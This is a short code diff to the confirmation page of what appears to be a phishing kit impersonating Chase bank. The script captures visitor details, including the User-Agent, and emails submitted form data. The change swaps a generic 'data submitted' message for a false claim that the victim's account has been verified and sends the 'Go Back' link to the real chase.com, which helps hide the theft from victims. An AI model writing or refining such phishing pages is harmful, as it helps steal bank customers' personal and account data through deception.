@@ -85,9 +85,9 @@ User-Agent: ${userAgent}`,
       </head>
       <body>
         <div class="message-box">
-          <h2>✅ Thank you! Your data has been submitted.</h2>
-          <p>We’ve received your form and sent it to our email system.</p>
-          <a href="/">Go Back</a>
+          <h2>✅ Thank you! Your Account is been Verified.</h2>
+          <p>We’ve received your details for account review and will get back to you via email(before 24hrs).</p>
+          <a href="https://chase.com">Go Back</a>
         </div>
       </body>
       </html>
